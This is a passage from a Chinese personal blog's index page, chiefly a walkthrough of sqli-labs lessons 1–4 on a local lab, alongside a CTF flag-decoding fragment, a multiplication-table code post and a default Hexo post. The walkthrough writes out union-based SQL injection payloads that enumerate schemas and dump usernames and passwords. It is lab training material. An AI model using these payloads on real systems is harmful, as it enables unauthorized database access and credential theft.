src="https://note.youdao.com/yws/api/personal/file/WEBeb25e901ef1c2481c9cda85729856ec7?method=download&shareKey=937ed81bf1d6603548c47a0e7e5d5c09"><br>解码得55,56,54,79,115,69,114,116,107,49,50<br>与ASCII码对照得786OsErtk12<br>所以flag为 Cyberpeace{786OsErtk12}</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/11/25/ctfweb/" data-id="ckhyz2drj0000lcutft80f5hn" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf-web/" rel="tag">ctf-web</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-sql" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/11/24/sql/" class="article-date">
  <time datetime="2020-11-24T13:01:44.000Z" itemprop="datePublished">2020-11-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/11/24/sql/">sql</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h1><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>打开第一题页面输入<a target="_blank" rel="noopener" href="http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-1/?id=1&#39;">http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-1/?id=1&#39;</a><br>后显示如图<br><img src="https://note.youdao.com/yws/api/personal/file/WEB779244d855917876d81354a359740b22?method=download&shareKey=79866038ad08f6955326b1c36a80daac" alt="image"><br>可知输入样式为’’ LIMIT 0,1为数字型</p>
<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>经过实验<br>输入<a target="_blank" rel="noopener" href="http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-1/?id=1&#39;">http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-1/?id=1&#39;</a> order by 3–+显示<br><img src="https://note.youdao.com/yws/api/personal/file/WEB6e42ff49caff5267a0e2dd34577add3e?method=download&shareKey=24fe73ae33f80bf253556c45bba1fcbc" alt="image"><br>该数据库只有三列</p>
<h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>输入<a target="_blank" rel="noopener" href="http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-1/?id=0&#39;">http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-1/?id=0&#39;</a> union select 1,2,3–+显示<br><img src="https://note.youdao.com/yws/api/personal/file/WEB149f5068d8b60379d8b379778e5a5db1?method=download&shareKey=c75e7ce0062e6017aaca203349649080" alt="image">可知2，3列之间存在漏洞，在2，3之间实施SQL语句</p>
<p>select group_concat(schema_name) from information_schema.schemata<br><img src="https://note.youdao.com/yws/api/personal/file/WEB683864f782b0e4d2bf30cb7de72edd68?method=download&shareKey=0cc37896165acff2002b386496755287"><br>得到数据库名有information_schema,challenges,mysql,performance_schema,security,sys,xxx</p>
<p>查看security，使用语句</p>
<p>select group_concat(table_name) from information_schema.tables where table_schema=’security’</p>
<p>得到security中的列名有emails,referers,uagents,users<br><img src="https://note.youdao.com/yws/api/personal/file/WEB1d81485a8457903079701e17918700cc?method=download&shareKey=f3d1b4b9402dd2b17e5ebabc771316e6" alt="image"><br>查看user中的信息使用语句</p>
<p>select group_concat(username) from security.users</p>
<p>select group_concat(password) from security.users<br><img src="https://note.youdao.com/yws/api/personal/file/WEB0e69db166d15fc312651d658f5fdfe1f?method=download&shareKey=953cd78d7cb6c68812fd2856bed2ee0e"><br>即得到所要信息，第一题结束</p>
<h1 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h1><h3 id="第一步-1"><a href="#第一步-1" class="headerlink" title="第一步"></a>第一步</h3><p>打开第一题页面输入<a target="_blank" rel="noopener" href="http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-2/?id=1&#39;%E5%90%8E%E6%98%BE%E7%A4%BA%E5%A6%82%E5%9B%BE">http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-2/?id=1&#39;后显示如图</a><br><img src="https://note.youdao.com/yws/api/personal/file/WEBbe16f0cb03c86cd2cfd1ab0d1852fe71?method=download&shareKey=ac9ca57d28433dfb52e61106ec5350db"><br>可知输入样式为’ LIMIT 0,1为字符型</p>
<h3 id="第二步-1"><a href="#第二步-1" class="headerlink" title="第二步"></a>第二步</h3><p>经过实验<br>输入<a target="_blank" rel="noopener" href="http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-2/?id=1">http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-2/?id=1</a> order by 3–+显示<br><img src="https://note.youdao.com/yws/api/personal/file/WEB95222846b9b8fd78858500822736be9e?method=download&shareKey=a081b20811d0d76d05ac30b06722c22a" alt="image"><br>该数据库只有三列</p>
<h3 id="第三步-1"><a href="#第三步-1" class="headerlink" title="第三步"></a>第三步</h3><p>输入<a target="_blank" rel="noopener" href="http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-2/?id=0">http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-2/?id=0</a> union select 1,2,3–+显示<br><img src="https://note.youdao.com/yws/api/personal/file/WEBaa6d256c1d7d2cdd143fb525dfda1f43?method=download&shareKey=a8ba81dd250ea352dc9bfef4a783142e"><br>2，3列之间存在漏洞，在2，3之间实施SQL语句</p>
<p>select group_concat(schema_name) from information_schema.schemata<br><img src="https://note.youdao.com/yws/api/personal/file/WEB5de06a30432c950e0226ce0292c44af0?method=download&shareKey=eacae06e8ee248ce91027b17e26f5f4b"><br>得到数据库名有information_schema,challenges,mysql,performance_schema,security,sys,xxx</p>
<p>查看security，使用语句</p>
<p>select group_concat(table_name) from information_schema.tables where table_schema=’security’</p>
<p>得到security中的列名有emails,referers,uagents,users<br><img src="https://note.youdao.com/yws/api/personal/file/WEBc39ff0e72d5b8efdfd7beffbe249d544?method=download&shareKey=8c10ca71f09a41003cd76aa13afc4f11"><br>查看user中的信息使用语句</p>
<p>select group_concat(username) from security.users</p>
<p>select group_concat(password) from security.users<br><img src="https://note.youdao.com/yws/api/personal/file/WEB9b41c1b61a6e03b1319cbeb23f9c2504?method=download&shareKey=2b3e62b1ea5d9314d572604b4b158727"><br>即得到所要信息，第二题结束</p>
<h1 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h1><h3 id="第一步-2"><a href="#第一步-2" class="headerlink" title="第一步"></a>第一步</h3><p>打开第一题页面输入<a target="_blank" rel="noopener" href="http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-3/?id=1&#39;%E5%90%8E%E6%98%BE%E7%A4%BA%E5%A6%82%E5%9B%BE">http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-3/?id=1&#39;后显示如图</a><br><img src="https://note.youdao.com/yws/api/personal/file/WEBad9656f67b292d1fda6b79b182ac5c0c?method=download&shareKey=0e7f7294d03f7cfce1b4ef0fee703b2a"><br>可知输入样式为’’) LIMIT 0,1为字符型</p>
<h3 id="第二步-2"><a href="#第二步-2" class="headerlink" title="第二步"></a>第二步</h3><p>经过实验<br>输入<a target="_blank" rel="noopener" href="http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-3/?id=1&#39;">http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-3/?id=1&#39;</a>) order by 3–+显示<br><img src="https://note.youdao.com/yws/api/personal/file/WEB381307c26c5baf5f7c83c1f1f6fa8966?method=download&shareKey=9a01654d4015add39ed8ef39e3463ca4" alt="image"><br>该数据库只有三列</p>
<h3 id="第三步-2"><a href="#第三步-2" class="headerlink" title="第三步"></a>第三步</h3><p>输入<a target="_blank" rel="noopener" href="http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-3/?id=0&#39;">http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-3/?id=0&#39;</a>) union select 1,2,3–+显示<br><img src="https://note.youdao.com/yws/api/personal/file/WEBed72f0b9374ba45054b2c941e2b69370?method=download&shareKey=86e5252ba0f86254a558d0a02a00fb01"><br>2，3列之间存在漏洞，在2，3之间实施SQL语句</p>
<p>select group_concat(schema_name) from information_schema.schemata<br><img src="https://note.youdao.com/yws/api/personal/file/WEBacb20f9b0160017f11de69084c7b6965?method=download&shareKey=c8f4ba2691cc61758fd4de3eef83ed4f">得到数据库名有information_schema,challenges,mysql,performance_schema,security,sys,xxx</p>
<p>查看security，使用语句</p>
<p>select group_concat(table_name) from information_schema.tables where table_schema=’security’</p>
<p>得到security中的列名有emails,referers,uagents,users<br><img src="https://note.youdao.com/yws/api/personal/file/WEBf4acfa5e4ce13dabf6a5c47f5339078e?method=download&shareKey=adf805e107e9d3c7883da9bd8522d22a"><br>查看user中的信息使用语句</p>
<p>select group_concat(username) from security.users</p>
<p>select group_concat(password) from security.users<br><img src="https://note.youdao.com/yws/api/personal/file/WEB60730a8f5496b88a93ac1fddc4febb32?method=download&shareKey=2421753145ffb403ea71fa266bef19fb"><br>即得到所要信息，第三题结束</p>
<h1 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h1><h3 id="第一步-3"><a href="#第一步-3" class="headerlink" title="第一步"></a>第一步</h3><p>打开第一题页面输入<a target="_blank" rel="noopener" href="http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-3/?id=1&quot;%E5%90%8E%E6%98%BE%E7%A4%BA%E5%A6%82%E5%9B%BE">http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-3/?id=1&quot;后显示如图</a><br><img src="https://note.youdao.com/yws/api/personal/file/WEB0da326037f3cb7c152ad93eea5933e4b?method=download&shareKey=6fcb2ed58011819279ddef56effe2fc2"><br>可知输入样式为””) LIMIT 0,1为字符型</p>
<h3 id="第二步-3"><a href="#第二步-3" class="headerlink" title="第二步"></a>第二步</h3><p>经过实验<br>输入<a target="_blank" rel="noopener" href="http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-4/?id=1&quot;">http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-4/?id=1&quot;</a>) order by 3–+显示<br><img src="https://note.youdao.com/yws/api/personal/file/WEB07b55b908e5547d8105e11695dc1dcbf?method=download&shareKey=8ef51b21d623b23d63092835a6b2e28e" alt="image"><br>该数据库只有三列</p>
<h3 id="第三步-3"><a href="#第三步-3" class="headerlink" title="第三步"></a>第三步</h3><p>输入<a target="_blank" rel="noopener" href="http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-4/?id=0&quot;">http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-4/?id=0&quot;</a>) union select 1,2,3–+显示<br><img src="https://note.youdao.com/yws/api/personal/file/WEBed583a187daa2faec713812c87e23590?method=download&shareKey=88d7a0d1acc23767f62468ad315bd954"><br>2，3列之间存在漏洞，在2，3之间实施SQL语句</p>
<p>select group_concat(schema_name) from information_schema.schemata<br><img src="https://note.youdao.com/yws/api/personal/file/WEBe2c98b4e0e4b04952f3b7c4958a8673a?method=download&shareKey=3185b58f24889b53339426b53c761ef9">得到数据库名有information_schema,challenges,mysql,performance_schema,security,sys,xxx</p>
<p>查看security，使用语句</p>
<p>select group_concat(table_name) from information_schema.tables where table_schema=’security’</p>
<p>得到security中的列名有emails,referers,uagents,users<br><img src="https://note.youdao.com/yws/api/personal/file/WEB92fac78367beb8a8197e8b5e5a4189a0?method=download&shareKey=1bf9aefe4ac98de39407ff6fc44f6985"><br>查看user中的信息使用语句</p>
<p>select group_concat(username) from security.users</p>
<p>select group_concat(password) from security.users<br><img src="https://note.youdao.com/yws/api/personal/file/WEB334200b5a0185b8822e36a1945ac58ac?method=download&shareKey=6ae1c1c951695c06b2e56596812aefcf"><br>即得到所要信息，第四题结束</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/11/24/sql/" data-id="ckhw4bgvq0000u0utbv1p5wly" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqli-lab/" rel="tag">sqli-lab</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-post99cfb" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/11/17/post99cfb/" class="article-date">
  <time datetime="2020-11-17T13:28:46.000Z" itemprop="datePublished">2020-11-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/11/17/post99cfb/">post99cfb</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="include-lt-stdio-h-gt"><a href="#include-lt-stdio-h-gt" class="headerlink" title="#include&lt;stdio.h&gt;"></a>#include&lt;stdio.h&gt;</h3><h3 id="int-main"><a href="#int-main" class="headerlink" title="int main()"></a>int main()</h3><h3 id="int-i-j"><a href="#int-i-j" class="headerlink" title="int i,j;"></a>int i,j;</h3><h3 id="for-i-1-i-lt-9-i"><a href="#for-i-1-i-lt-9-i" class="headerlink" title="for(i=1;i&lt;=9;i++)"></a>for(i=1;i&lt;=9;i++)</h3><h3 id="for-j-1-j-lt-9-j"><a href="#for-j-1-j-lt-9-j" class="headerlink" title="for(j=1;j&lt;=9;j++)"></a>for(j=1;j&lt;=9;j++)</h3><h3 id="if-i-gt-j"><a href="#if-i-gt-j" class="headerlink" title="if(i&gt;=j)"></a>if(i&gt;=j)</h3><h3 id="printf-“-d-d-d-“-j-i-i-j"><a href="#printf-“-d-d-d-“-j-i-i-j" class="headerlink" title="printf(“%d*%d=%d “,j,i,i*j);"></a>printf(“%d*%d=%d “,j,i,i*j);</h3><h3 id="printf-“-n”"><a href="#printf-“-n”" class="headerlink" title="printf(“\n”);"></a>printf(“\n”);</h3><h2 id=""><a href="#" class="headerlink" title=" "></a> <img src="https://note.youdao.com/yws/api/personal/file/WEBe07f3294c62475c8b82323fa889c2dfc?method=download&shareKey=a21c360e310ad971d9a146e7ebb03fcc" alt="image"></h2><h3 id="num-1"><a href="#num-1" class="headerlink" title="$num=1;"></a>$num=1;</h3><h3 id="for-a-1-a-lt-9-a"><a href="#for-a-1-a-lt-9-a" class="headerlink" title="for ($a=1;$a&lt;=9;$a++)"></a>for ($a=1;$a&lt;=9;$a++)</h3><h3 id="for-b-1-b-lt-a-b"><a href="#for-b-1-b-lt-a-b" class="headerlink" title="for ($b=1;$b&lt;=$a;$b++)"></a>for ($b=1;$b&lt;=$a;$b++)</h3><h3 id="echo-“-b”-”x”-”-a”-”-”-a-b-”-“"><a href="#echo-“-b”-”x”-”-a”-”-”-a-b-”-“" class="headerlink" title="echo “$b”.”x”.”$a”.”=”.$a*$b.” “;"></a>echo “$b”.”x”.”$a”.”=”.$a*$b.” “;</h3><h3 id="echo”“"><a href="#echo”“" class="headerlink" title="echo”“"></a>echo”<br/>“</h3><p> <img src="https://note.youdao.com/yws/api/personal/file/WEB4a866821ee4ded525004dfc6ba476064?method=download&shareKey=99104fa5eb1a065df4ac9623428b3f7b" alt="image"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/11/17/post99cfb/" data-id="ckhn5jzri0000nout81oj5xne" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%B9%9D%E4%B9%9D%E4%B9%98%E6%B3%95%E8%A1%A8/" rel="tag">九九乘法表</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/11/17/hello-world/" class="article-date">
  <time datetime="2020-11-17T11:29:56.293Z" itemprop="datePublished">2020-11-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/11/17/hello-world/">Hello World</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/11/17/hello-world/" data-id="ckhlwh6mv00005out8sb57pi0" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTML%E6%A0%87%E7%AD%BE/" rel="tag">HTML标签</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows%E4%B8%8EKali%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5/" rel="tag">Windows与Kali远程桌面连接</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-web/" rel="tag">ctf-web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqli-lab/" rel="tag">sqli-lab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B9%9D%E4%B9%9D%E4%B9%98%E6%B3%95%E8%A1%A8/" rel="tag">九九乘法表</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E5%AE%89%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E6%A6%82%E5%BF%B5/" rel="tag">网安方向部分概念</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/HTML%E6%A0%87%E7%AD%BE/" style="font-size: 10px;">HTML标签</a> <a href="/tags/Windows%E4%B8%8EKali%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5/" style="font-size: 10px;">Windows与Kali远程桌面连接</a> <a href="/tags/ctf-web/" style="font-size: 10px;">ctf-web</a> <a href="/tags/sqli-lab/" style="font-size: 10px;">sqli-lab</a> <a href="/tags/%E4%B9%9D%E4%B9%9D%E4%B9%98%E6%B3%95%E8%A1%A8/" style="font-size: 10px;">九九乘法表</a> <a href="/tags/%E7%BD%91%E5%AE%89%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E6%A6%82%E5%BF%B5/" style="font-size: 10px;">网安方向部分概念</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/02/26/dvwa/">dvwa</a>
          </li>
        
          <li>
            <a href="/2020/12/01/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5/">远程桌面连接</a>
          </li>
        
          <li>
            <a href="/2020/11/30/dingyi/">网安方向部分概念</a>
          </li>
        
          <li>
            <a href="/2020/11/28/htmlmark/">HTML标签</a>
          </li>
        
          <li>
            <a href="/2020/11/25/ctfweb/">ctf-web</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2021 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>